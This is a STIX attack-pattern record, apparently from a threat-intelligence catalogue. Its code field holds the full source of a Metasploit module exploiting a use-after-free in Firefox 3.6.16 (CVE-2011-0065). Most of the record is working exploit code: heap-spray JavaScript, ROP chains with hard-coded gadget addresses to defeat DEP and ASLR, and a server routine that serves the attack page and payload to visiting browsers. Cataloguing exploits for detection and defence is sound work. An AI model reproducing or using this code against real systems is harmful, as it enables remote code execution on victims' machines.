{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5ffbbb37-2052-46fc-81f3-562bb7eeebb3",
    "created": "2024-08-14T16:41:35.79596Z",
    "modified": "2024-08-14T16:41:35.795965Z",
    "name": "Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability",
    "description": " This module exploits a use after free vulnerability in Mozilla Firefox 3.6.16. An OBJECT Element mChannel can be freed via the OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel becomes a dangling pointer and can be reused when setting the OBJECTs data attribute. (Discovered by regenrecht). This module uses heapspray with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay a windows 7 target was provided using JAVA 6 and below to avoid aslr.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_mchannel.rb",
            "external_id": "mozilla_mchannel.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0065"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=634986"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/2011/mfsa2011-13.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name => HttpClients::FF,\n  #  :ua_minver => \"3.6.16\",\n  #  :ua_maxver => \"3.6.16\",\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :javascript => true,\n  #  :rank => NormalRanking,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mozilla Firefox 3.6.16 mChannel Use-After-Free Vulnerability',\n      'Description'    => %q{\n          This module exploits a use after free vulnerability in Mozilla\n        Firefox 3.6.16. An OBJECT Element mChannel can be freed via the\n        OnChannelRedirect method of the nsIChannelEventSink Interface. mChannel\n        becomes a dangling pointer and can be reused when setting the OBJECTs\n        data attribute. (Discovered by regenrecht). This module uses heapspray\n        with a minimal ROP chain to bypass DEP on Windows XP SP3. Additionlay,\n        a windows 7 target was provided using JAVA 6 and below to avoid aslr.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'regenrecht',  # discovery\n          'Rh0',         # metasploit module\n          'mr_me <steventhomasseeley[at]gmail.com>' # win7 target\n        ],\n      'References'     =>\n        [\n          ['CVE',    '2011-0065'],\n          ['OSVDB',  '72085'],\n          ['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=634986'],\n          ['URL',    'http://www.mozilla.org/security/announce/2011/mfsa2011-13.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space' => 1024,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n\n          [ 'Automatic', { } ],\n\n          # DEP bypass\n          [\n            'Firefox 3.6.16 on Windows XP SP3',\n            {\n              'Arch' => ARCH_X86,\n              'Fakevtable' => 0x0c00,\n              'Fakefunc' => 0x0c00001c,\n            }\n          ],\n\n          # requires JAVA <= JAVA 6 update 26\n          # cop stack pivot = ASLR/DEP bypass\n          [\n            'Firefox 3.6.16 on Windows 7 + Java',\n            {\n              'Arch' => ARCH_X86,\n              'Fakevtable' => 0x1000,\n              'Fakefunc' => 0x100002a4,\n              'Ppppr' => 0x7c3410c0,\n              'Retn' => 0x7c3410c4,\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-05-10'\n      ))\n  end\n\n  def junk\n    return rand_text_alpha(4).unpack(\"L\")[0].to_i\n  end\n\n  def on_request_uri(cli, request)\n\n    # Random JavaScript variable names\n    js_element_name      = rand_text_alpha(rand(10) + 5)\n    js_obj_addr_name     = rand_text_alpha(rand(10) + 5)\n    js_sc_name           = rand_text_alpha(rand(10) + 5)\n    js_ret_addr_name     = rand_text_alpha(rand(10) + 5)\n    js_chunk_name        = rand_text_alpha(rand(10) + 5)\n    js_final_chunk_name  = rand_text_alpha(rand(10) + 5)\n    js_block_name        = rand_text_alpha(rand(10) + 5)\n    js_array_name        = rand_text_alpha(rand(10) + 5)\n    js_retns             = rand_text_alpha(rand(10) + 5)\n    js_applet_name       = rand_text_alpha(rand(10) + 5)\n    js_ppppr             = rand_text_alpha(rand(10) + 5)\n    js_filler            = rand_text_alpha(rand(10) + 5)\n\n    agent = request.headers['User-Agent']\n\n    # Set target manually or automatically\n    my_target = target\n    if my_target.name == 'Automatic'\n      if agent =~ /NT 5\\.1/ and agent =~ /Firefox\\/3\\.6\\.16/\n        my_target = targets[1]\n      elsif agent =~ /NT 6\\.1/ and agent =~ /Firefox\\/3\\.6\\.16/\n        my_target = targets[2]\n      end\n    end\n\n    # check for non vulnerable targets\n    if agent !~ /NT 5\\.1/ or agent !~ /NT 6\\.1/ and agent !~ /Firefox\\/3\\.6\\.16/\n      print_error(\"Target not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli).encoded) == nil)\n\n    if my_target.name =~ /Windows 7/ and not request.uri =~ /\\.html/\n\n      html_trigger = \"\"\n      if (\"/\" == get_resource[-1,1])\n        html_trigger = get_resource[0, get_resource.length - 1]\n      else\n        html_trigger = get_resource\n      end\n\n      custom_js = <<-JS\n      function forward() {\n        window.location = window.location + \"#{html_trigger}.html\";\n      }\n\n      function start() {\n        setTimeout(\"forward()\", 3500);\n      }\n      start();\n      JS\n\n    else\n      if my_target.name =~ /Windows XP/\n\n        # DEP bypass using xul.dll\n        rop_gadgets = [\n          0x1052c871,  # mov esp,[ecx] / mov edx,5c86c6ff / add [eax],eax / xor eax,eax / pop esi / retn 0x8 [xul.dll]\n          junk,        # junk --------------------------------------------------------------^^\n          0x7c801ad4,  # VirtualProtect\n          junk,        # junk -------------------------------------------------------------------------^^\n          junk,        # junk -------------------------------------------------------------------------^^\n          0x1003876B,  # jmp esp\n          0x0c000040,  # start address\n          0x00000400,  # size 1024\n          0x00000040,  # Page EXECUTE_READ_WRITE\n          0x0c0c0c00,  # old protection\n        ].pack(\"V*\")\n\n        rop = rop_gadgets\n\n      elsif my_target.name =~ /Windows 7/ and request.uri =~ /\\.html/\n\n        # 5 gadgets to pivot using call oriented programming (cop)\n        # these instructions are taken from: java.dll, zip.dll and MSVCR71.dll (non aslr)\n        # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]\n        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]\n        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]\n        # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)\n        # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN\n\n        rop_pivot = [\n          0x6D32280C,  # 1. MOV EDX,DWORD PTR DS:[ECX] / junk / junk / junk / PUSH ECX / CALL [EDX+28C]\n          junk,        # filler\n          0x6D7E627D,  # 4. CALL [EAX+24] / POP ECX / POP ECX / RETN (neatly place address onto the stack)\n          0x7C3413A4,  # 5. ADD EAX,4 / TEST [EAX],EAX / XCHG EAX,ESP / MOV EAX,[EAX] / PUSH EAX / RETN\n        ].pack(\"V*\")\n\n        # 319\n\n        # rop nops - RETN\n        rop_pivot << [0x7c3410c4].pack(\"V*\") * 0x65 #(0xca-0x65)\n\n        # POP r32 / RETN\n        rop_pivot << [0x7c3410c3].pack(\"V*\")\n\n        # 3. PUSH EBP / MOV EBP,ESP / MOV EAX,[EBP+18] / PUSH 1C / PUSH 1 / PUSH [EAX+28] / CALL [EAX+20]\n        rop_pivot << [0x6D7E5CDA].pack(\"V*\")\n\n        # rop nops - RETN\n        rop_pivot << [0x7c3410c4].pack(\"V*\") * 0xda # (0x75+0x65)\n\n        # POP r32 / RETN\n        rop_pivot << [0x7c3410c3].pack(\"V*\")\n\n        # 2. PUSH EAX / PUSH EBX / PUSH ESI / CALL [ECX+1C0]\n        rop_pivot << [0x6D325BFC].pack(\"V*\")\n\n        # https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/ <MSVCR71.dll>\n        rop_gadgets = [\n          0x7c346c0a,  # POP EAX / RETN\n          0x7c37a140,  # Make EAX readable\n          0x7c37591f,  # PUSH ESP / ... / POP ECX / POP EBP / RETN\n          junk,        # EBP (filler)\n          0x7c346c0a,  # POP EAX / RETN\n          0x7c37a140,  # *&VirtualProtect()\n          0x7c3530ea,  # MOV EAX,[EAX] / RETN\n          0x7c346c0b,  # Slide, so next gadget would write to correct stack location\n          0x7c376069,  # MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN\n          junk,        # EDI (filler)\n          junk,        # will be patched at runtime (VP), then picked up into ESI\n          junk,        # EBX (filler)\n          0x7c376402,  # POP EBP / RETN\n          0x7c345c30,  # ptr to 'push esp /  ret'\n          0x7c346c0a,  # POP EAX / RETN\n          0xfffffdff,  # size 0x00000201 -> ebx\n          0x7c351e05,  # NEG EAX / RETN\n          0x7c354901,  # POP EBX / RETN\n          0xffffffff,  # pop value into ebx\n          0x7c345255,  # INC EBX / FPATAN / RETN\n          0x7c352174,  # ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN\n          0x7c34d201,  # POP ECX / RETN\n          0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\n          0x7c34b8d7,  # POP EDI / RETN\n          0x7c34b8d8,  # ROP NOP (-> edi)\n          0x7c344f87,  # POP EDX / RETN\n          0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\n          0x7c351eb1,  # NEG EDX / RETN\n          0x7c346c0a,  # POP EAX / RETN\n          0x90909090,  # NOPS (-> eax)\n          0x7c378c81,  # PUSHAD / ADD AL,0EF / RETN\n          0x90909090,  # NOPS (-> eax)\n        ].pack(\"V*\")\n\n        rop = rop_pivot + rop_gadgets\n\n      end\n\n      payload_buf  = ''\n      payload_buf << rop\n      payload_buf << p\n      escaped_payload = Rex::Text.to_unescape(payload_buf)\n\n      # setup the fake memory references\n      fakevtable = Rex::Text.to_unescape([my_target['Fakevtable']].pack('v'))\n      fakefunc = Rex::Text.to_unescape([my_target['Fakefunc']].pack('V*'))\n\n      if my_target.name =~ /Windows XP/\n\n        # fast loading JS so we dont get the 'unresponsive script' warning from ff\n        custom_js = <<-JS\n        #{js_element_name} = document.getElementById(\"d\");\n        #{js_element_name}.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)\n\n        #{js_obj_addr_name} = unescape(\"\\x00#{fakevtable}\");\n        var #{js_sc_name} = unescape(\"#{escaped_payload}\");\n\n        var #{js_ret_addr_name} = unescape(\"#{fakefunc}\");\n        while(#{js_ret_addr_name}.length < 0x80) {#{js_ret_addr_name} += #{js_ret_addr_name};}\n        var #{js_chunk_name} = #{js_ret_addr_name}.substring(0,0x18/2);\n        #{js_chunk_name} += #{js_sc_name};\n        #{js_chunk_name} += #{js_ret_addr_name};\n        var #{js_final_chunk_name} = #{js_chunk_name}.substring(0,0x10000/2);\n        while (#{js_final_chunk_name}.length<0x800000) {#{js_final_chunk_name} += #{js_final_chunk_name};}\n        var #{js_block_name} = #{js_final_chunk_name}.substring(0,0x80000 - #{js_sc_name}.length - 0x24/2 - 0x4/2 - 0x2/2);\n        #{js_array_name} = new Array()\n        for (n=0;n<0x80;n++){\n          #{js_array_name}[n] = #{js_block_name} + #{js_sc_name};\n        }\n        JS\n      elsif my_target.name =~ /Windows 7/\n\n        # setup precision heap spray\n        ppppr = Rex::Text.to_unescape([my_target['Ppppr']].pack('V*'))\n        retns = Rex::Text.to_unescape([my_target['Retn']].pack('V*'))\n\n        # fast loading JS so we dont get the 'unresponsive script' warning from ff\n        # precision heap spray\n        custom_js = <<-JS\n        #{js_element_name} = document.getElementById(\"d\");\n        #{js_element_name}.QueryInterface(Components.interfaces.nsIChannelEventSink).onChannelRedirect(null,new Object,0)\n\n        #{js_obj_addr_name} = unescape(\"\\x00#{fakevtable}\");\n        var #{js_sc_name} = unescape(\"#{escaped_payload}\");\n\n        var #{js_ret_addr_name} = unescape(\"#{fakefunc}\");\n        var #{js_retns} = unescape(\"#{retns}\");\n\n        #{js_ret_addr_name} += #{js_retns};\n        #{js_ret_addr_name} += #{js_retns};\n        #{js_ret_addr_name} += #{js_retns};\n        #{js_ret_addr_name} += #{js_retns};\n\n        var #{js_ppppr} = unescape(\"#{ppppr}\");\n        #{js_ret_addr_name} += #{js_ppppr};\n\n        var #{js_filler} = unescape(\"%u4344%u4142\");\n        while(#{js_filler}.length < 0x201) {#{js_filler} += #{js_filler};}\n\n        while(#{js_ret_addr_name}.length < 0x80) {#{js_ret_addr_name} += #{js_ret_addr_name};}\n\n        var #{js_chunk_name} = #{js_ret_addr_name}.substring(0,0x18/2);\n\n        #{js_chunk_name} += #{js_sc_name};\n        #{js_chunk_name} += #{js_filler};\n        #{js_chunk_name} += #{js_ret_addr_name};\n\n        var #{js_final_chunk_name} = #{js_chunk_name}.substring(0,0x10000/2);\n        while (#{js_final_chunk_name}.length<0x800000) {#{js_final_chunk_name} += #{js_final_chunk_name};}\n        var #{js_block_name} = #{js_final_chunk_name}.substring(0,0x80000 - #{js_sc_name}.length - 0x24/2 - 0x4/2 - 0x2/2);\n        #{js_array_name} = new Array()\n        for (n=0;n<0x80;n++){\n          #{js_array_name}[n] = #{js_block_name} + #{js_sc_name};\n        }\n        JS\n      end\n    end\n\n    html = <<-HTML\n    <html>\n    <body>\n      <object id=\"d\"><object>\n      <applet code=\"#{js_applet_name}.class\" width=0 height=0></applet>\n      <script type=\"text/javascript\">\n      #{custom_js}\n      </script>\n    </body>\n    </html>\n    HTML\n\n    #Remove the extra tabs\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response_html(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-05-10",
    "x_mitre_platforms": [
        "win'"
    ]
}